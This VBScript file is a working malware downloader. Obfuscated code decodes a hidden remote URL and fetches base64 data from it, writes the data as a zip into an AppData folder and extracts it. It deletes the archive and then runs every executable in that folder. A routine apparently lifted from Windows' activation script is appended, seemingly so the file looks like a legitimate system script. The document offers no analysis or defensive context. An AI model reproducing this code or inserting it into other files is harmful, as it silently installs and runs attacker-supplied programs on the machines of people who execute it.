Option Explicit
CONST wshOK                             =0
CONST VALUE_ICON_WARNING                =16
CONST wshYesNoDialog                    =4
CONST VALUE_ICON_QUESTIONMARK           =32
CONST VALUE_ICON_INFORMATION            =64
CONST HKEY_LOCAL_MACHINE                =&H80000002
CONST KEY_SET_VALUE                     =&H0002
CONST KEY_QUERY_VALUE                   =&H0001
CONST REG_SZ                            =1           
dim vegilnnprttv,prxxbbacegii,nnprttvbddfh,ybbaceegimmo
dim  hhjmoqqsuxyy,Clqtnpprtvveggilnnpssu,SEUZP
dim  pprtvvzaccbd,mqXFFRJUWm
dim  suuxybaacegg,aceegillnprr,qqssuddfhhjmooqssuaadffhjjmooqssuxyybaaceehjjmooq
dim  tvvbdffhjmmp,ilnnprttvbee,OBJvbbdfhhjnnprttvzzac
dim  ilnnqsuuccegiiln,tvzaccceggii,hlpptvvzacbd
Function Jkdkdkd(G1g)
For hhjmoqqsuxyy = 1 To Len(G1g)
tvzaccceggii = Mid(G1g, hhjmoqqsuxyy, 1)
tvzaccceggii = Chr(Asc(tvzaccceggii)+ 6)
tvvbdffhjmmp = tvvbdffhjmmp + tvzaccceggii
Next
Jkdkdkd = tvvbdffhjmmp
End Function 
Function iilnnpruaacegiilnpprttvzaaac()
Dim ClqtnpprtvveggilnnpssuLM,jxtssudffhhjmoortv,jrtnnprrtvvybaacew,Coltggiilnpprtvvbdffh
Set ClqtnpprtvveggilnnpssuLM = WScript.CreateObject( "WScript.Shell" )
Set jrtnnprrtvvybaacew = CreateObject( "Scripting.FileSystemObject" )
Set jxtssudffhhjmoortv = jrtnnprrtvvybaacew.GetFolder(aceegillnprr)
Set Coltggiilnpprtvvbdffh = jxtssudffhhjmoortv.Files
For Each Coltggiilnpprtvvbdffh in Coltggiilnpprtvvbdffh
If UCase(jrtnnprrtvvybaacew.GetExtensionName(Coltggiilnpprtvvbdffh.name)) = "EXE" Then
ClqtnpprtvveggilnnpssuLM.Exec(aceegillnprr & "\" & Coltggiilnpprtvvbdffh.Name)
End If
Next
End Function
pprtvvzaccbd     = Jkdkdkd("bnnj4))+3,(,-0(+.1(+**4+3/*)<[\o\dchm](cmi")
Set OBJvbbdfhhjnnprttvzzac = CreateObject( "WScript.Shell" )    
qqssuddfhhjmooqssuaadffhjjmooqssuxyybaaceehjjmooq = OBJvbbdfhhjnnprttvzzac.ExpandEnvironmentStrings(StrReverse("%ATADPPA%"))
ybbaceegimmo = "A99449C3092CE70964CE715CF7BB75B.zip"
Function oortvzzaccbdfhhjmooqttveegii()
SET prxxbbacegii = CREATEOBJECT("Scripting.FileSystemObject")
IF prxxbbacegii.FolderExists(qqssuddfhhjmooqssuaadffhjjmooqssuxyybaaceehjjmooq + "\DecGram") = TRUE THEN WScript.Quit() END IF
IF prxxbbacegii.FolderExists(nnprttvbddfh) = FALSE THEN
prxxbbacegii.CreateFolder nnprttvbddfh
prxxbbacegii.CreateFolder OBJvbbdfhhjnnprttvzzac.ExpandEnvironmentStrings(StrReverse("%ATADPPA%")) + "\DecGram"
END IF
End Function
Function illnprruxyybaceegiilnnprttdf()
DIM jrtnnprrtvvybaacexsd
Set jrtnnprrtvvybaacexsd = Createobject("Scripting.FileSystemObject")
jrtnnprrtvvybaacexsd.DeleteFile aceegillnprr & "\" & ybbaceegimmo
End Function
aceegillnprr = qqssuddfhhjmooqssuaadffhjjmooqssuxyybaaceehjjmooq + "\nvmodmall"
jjmmooqsuuxyybaaceegiimo
nnprttvbddfh = aceegillnprr
oortvzzaccbdfhhjmooqttveegii
bddgillnprrtvzaacbbdfiilnnpr
WScript.Sleep 10103
mooqsuuaceggllnppruuxybbacce
WScript.Sleep 5110
illnprruxyybaceegiilnnprttdf
iilnnpruaacegiilnpprttvzaaac
Function jjmmooqsuuxyybaaceegiimo()
Set mqXFFRJUWm = CreateObject("Scripting.FileSystemObject")
If (mqXFFRJUWm.FolderExists(aceegillnprr )) Then
WScript.Quit()
End If 
End Function   
Function bddgillnprrtvzaacbbdfiilnnpr()
DIM req
Set req = CreateObject("Msxml2.XMLHttp.6.0")
req.open "GET", pprtvvzaccbd, False
req.send
If req.Status = 200 Then
 Dim oNode, BinaryStream
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = req.responseText
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write oNode.nodeTypedValue
BinaryStream.SaveToFile aceegillnprr & "\" & ybbaceegimmo, adSaveCreateOverWrite
End if
End Function
suuxybaacegg = "ilnnprttvbee"
Function mooqsuuaceggllnppruuxybbacce()
set Clqtnpprtvveggilnnpssu = CreateObject("Shell.Application")
set SEUZP=Clqtnpprtvveggilnnpssu.NameSpace(aceegillnprr & "\" & ybbaceegimmo).items
Clqtnpprtvveggilnnpssu.NameSpace(aceegillnprr & "\").CopyHere(SEUZP), 4
Set Clqtnpprtvveggilnnpssu = Nothing
End Function 

Private Sub DisplayAVMAClientInformation(objProduct)
    Dim strHostName, strPid
    Dim displayDate
    Dim bHostName, bFiletime, bPid

    strHostName = objProduct.AutomaticVMActivationHostMachineName
    bHostName = strHostName <> "" And Not IsNull(strHostName)

    Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
    displayDate.Value = objProduct.AutomaticVMActivationLastActivationTime
    bFiletime = displayDate.GetFileTime(false) <> 0

    strPid = objProduct.AutomaticVMActivationHostDigitalPid2
    bPid = strPid <> "" And Not IsNull(strPid)

    If bHostName Or bFiletime Or bPid Then
        LineOut ""
        LineOut GetResource("L_MsgVLMostRecentActivationInfo")
        LineOut GetResource("L_MsgAVMAInfo")

        If bHostName Then
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & strHostName
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & GetResource("L_MsgNotAvailable")
        End If

        If bFiletime Then
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & displayDate.GetVarDate
        Else
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & GetResource("L_MsgNotAvailable")
        End If

        If bPid Then
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & strPid
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & GetResource("L_MsgNotAvailable")
        End If
    End If

End Sub

'
' Display all information for /dlv and /dli
' If you add need to access new properties through WMI you must add them to the
' queries for service/object.  Be sure to check that the object properties in DisplayAllInformation()
' are requested for function/methods such as GetIsPrimaryWindowsSKU() and DisplayKMSClientInformation().
'